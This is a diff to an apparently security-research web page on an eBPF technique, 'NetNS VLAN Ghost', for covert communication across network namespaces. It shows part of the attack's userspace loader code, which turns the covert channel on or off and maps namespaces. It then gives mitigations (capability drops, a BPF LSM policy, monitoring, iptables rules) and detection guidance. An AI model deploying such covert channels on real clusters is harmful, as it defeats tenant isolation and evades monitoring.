+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create perf buffer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Process command line arguments</span>
+    <span class="n">optind</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  <span class="c1">// Reset getopt</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">opt</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">"m:edh"</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="n">opt</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">case</span> <span class="sc">'m'</span><span class="p">:</span> <span class="p">{</span>
+                <span class="kt">int</span> <span class="n">src_ns</span><span class="p">,</span> <span class="n">dst_ns</span><span class="p">;</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">sscanf</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="s">"%d:%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">src_ns</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dst_ns</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">add_namespace_mapping</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">namespace_map</span><span class="p">),</span> <span class="n">src_ns</span><span class="p">,</span> <span class="n">dst_ns</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Invalid namespace mapping format. Use SRC:DST</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Set covert channel state</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">enable_covert</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">disable_covert</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">set_covert_channel</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">covert_config</span><span class="p">),</span> <span class="nb">true</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">disable_covert</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">enable_covert</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">set_covert_channel</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">covert_config</span><span class="p">),</span> <span class="nb">false</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"NetNS VLAN Ghost eBPF program loaded and running.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Monitoring for cross-namespace communication...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Press Ctrl+C to exit.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// Main loop</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">exiting</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="n">perf_buffer__poll</span><span class="p">(</span><span class="n">pb</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">err</span> <span class="o">!=</span> <span class="o">-</span><span class="n">EINTR</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Error polling perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+            <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="nl">cleanup:</span>
+    <span class="n">perf_buffer__free</span><span class="p">(</span><span class="n">pb</span><span class="p">);</span>
+    <span class="n">netns_vlan_ghost_bpf__destroy</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="o">-</span><span class="n">err</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+
+<ol>
+  <li><strong>Restrict eBPF Capabilities</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c"># Remove CAP_BPF from container</span>
+docker run <span class="nt">--cap-drop</span><span class="o">=</span>bpf <span class="nt">--security-opt</span> no-new-privileges ...
+   
+<span class="c"># In Kubernetes</span>
+securityContext:
+  capabilities:
+    drop:
+      - BPF
+      - SYS_ADMIN
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement BPF LSM Policies</strong>:
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c1">// Example BPF LSM policy to restrict BPF program loading</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"lsm/bpf"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">restrict_bpf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Only allow specific signing keys or programs from trusted paths</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_get_current_uid_gid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Multi-level Network Monitoring</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="c"># Monitor at the physical interface level</span>
+tcpdump <span class="nt">-i</span> eth0 <span class="nt">-n</span>
+   
+<span class="c"># Monitor inside namespaces</span>
+nsenter <span class="nt">--net</span><span class="o">=</span>/proc/[PID]/ns/net tcpdump <span class="nt">-i</span> eth0 <span class="nt">-n</span>
+   
+<span class="c"># Use eBPF-based network monitoring</span>
+bpftrace <span class="nt">-e</span> <span class="s1">'tracepoint:net:netif_receive_skb { printf("Packet received\n"); }'</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement Egress Filtering</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="c"># Block unexpected VLAN tags</span>
+iptables <span class="nt">-A</span> OUTPUT <span class="nt">-p</span> all <span class="nt">-m</span> vlan <span class="nt">--vlan-tag</span> 4242 <span class="nt">-j</span> DROP
+   
+<span class="c"># Restrict outbound connections</span>
+iptables <span class="nt">-A</span> OUTPUT <span class="nt">-p</span> tcp <span class="nt">--dport</span> 1234 <span class="nt">-j</span> DROP
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
 
 <h3 id="real-world-impact">Real-world Impact</h3>
 
@@ -597,6 +1374,19 @@
 </ul>
 
 <p>The ability to create invisible cross-namespace communication channels is particularly concerning for cloud environments, Kubernetes clusters, and other multi-tenant systems where network isolation is a fundamental security boundary.</p>
+
+<h3 id="detection-methods">Detection Methods</h3>
+
+<p>Defenders should monitor for:</p>
+<ul>
+  <li>Unexpected eBPF programs attached to network-related functions</li>
+  <li>Discrepancies in network traffic between different monitoring points</li>
+  <li>Unusual VLAN tag patterns or modifications</li>
+  <li>Unexpected cross-namespace communication</li>
+  <li>Traffic that appears on physical interfaces but not in namespace monitoring</li>
+</ul>
+
+<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining network isolation, especially in environments where network segmentation is a key security control.</p>
 
                     </div>
                 </article>
